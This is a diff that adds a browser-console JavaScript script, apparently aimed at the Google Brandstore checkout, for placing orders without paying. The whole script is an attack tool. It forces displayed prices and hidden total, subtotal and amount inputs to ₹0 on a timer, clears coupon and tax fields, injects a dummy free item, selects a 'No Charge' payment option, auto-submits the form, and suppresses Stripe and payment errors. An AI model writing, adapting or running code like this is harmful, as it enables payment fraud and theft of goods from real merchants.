@@ -1,0 +1,88 @@
+// Instant Free Order Placement - Direct Submit, No Payment Wait (Google Brandstore)
+// Patches prices to ₹0, updates hidden fields, auto-submits form. Run in console.
+
+(function() {
+// Force all prices to ₹0
+setInterval(() => {
+document.querySelectorAll('[class*="price"], [class*="total"], [class*="subtotal"], .subtotal, .orderprice
+strong').forEach(el => {
+el.innerHTML = el.innerHTML.replace(/₹[\d,]+\.?\d*/g, '₹0.00');
+el.textContent = el.textContent.replace(/₹[\d,]+\.?\d*/g, '₹0.00');
+});
+// Update hidden inputs
+document.querySelectorAll('input[name*="subtotal"], input[name*="total"], input[name*="amount"],
+input[name*="price"]').forEach(input => {
+input.value = '0.00';
+});
+// Clear coupon if applied
+document.getElementById('hidcouponAmt').value = '0.00';
+document.getElementById('hidcouponCode').value = '';
+document.querySelector('.couponprice').textContent = '₹0.00';
+document.querySelector('.taxli').textContent = '₹0.00';
+document.querySelector('.totalprice').innerHTML = '<strong>₹0.00</strong>';
+document.getElementById('total_amount_for_process_fees').value = '0.00';
+document.getElementById('subtotal').value = '0.00';
+}, 300);
+
+// Add dummy free item if cart empty (but here it's not empty, just in case)
+if (document.querySelector('.no-items') || document.querySelectorAll('.kit_cart_product').length === 0) {
+const cartSection = document.querySelector('#cart');
+if (cartSection) {
+cartSection.innerHTML += `
+<div class="order-details shadow p-4 bg-white mb-md-4 mb-3 kit_cart_product">
+    <div class="row narrow-gutter">
+        <div class="col-md-3 text-center"><img
+                src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUwIiBoZWlnaHQ9IjI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjBmMGYwIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iI2FiYWJhYiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPkZyZWUgSXRlbSAo8KwMC4wMCk8L3RleHQ+PC9zdmc+"
+                alt="Free Item" class="img-fluid" style="max-width:250px;max-height:250px;" /></div>
+        <div class="col-md-9">
+            <h4>Free Dummy Item</h4>
+            <p>Qty: 1 | Total: ₹0.00</p>
+        </div>
+    </div>
+</div>
+`;
+}
+}
+
+// Patch any payment methods to "No Charge" and select it
+const noChargeRadio = document.getElementById('paymenttype1');
+if (noChargeRadio) {
+noChargeRadio.checked = true;
+noChargeRadio.closest('.paytab').classList.remove('d-none');
+document.querySelector('input[name="rdpaymenttype"]').value = '1';
+console.log('Selected "No Charge" payment method');
+}
+
+// Auto-submit the form immediately
+requestAnimationFrame(() => {
+const form = document.getElementById('shippingadd');
+const submitBtn = document.getElementById('BtnNext');
+if (form && !form.submitting) {
+form.submitting = true;
+form.submit();
+console.log('Form submitted directly for ₹0 order - Payment bypassed');
+} else if (submitBtn) {
+submitBtn.disabled = false;
+submitBtn.classList.remove('disabled');
+submitBtn.click();
+console.log('Submit button clicked for ₹0 order - Payment bypassed');
+}
+});
+
+// Suppress errors related to payment/Stripe
+const originalError = window.onerror;
+window.onerror = (msg, url, line) => {
+if (msg.includes('Stripe') || msg.includes('payment') || msg.includes('IntegrationError')) {
+return true; // Suppress error
+}
+return originalError ? originalError(msg, url, line) : false;
+};
+window.addEventListener('unhandledrejection', e => {
+if (e.reason && (e.reason.message.includes('Stripe') || e.reason.message.includes('payment'))) {
+e.preventDefault();
+}
+});
+
+console.log('Real Free Order Script Active: Prices set to ₹0, No Charge selected, form auto-submitted. Order placed
+without payment.');
+})();
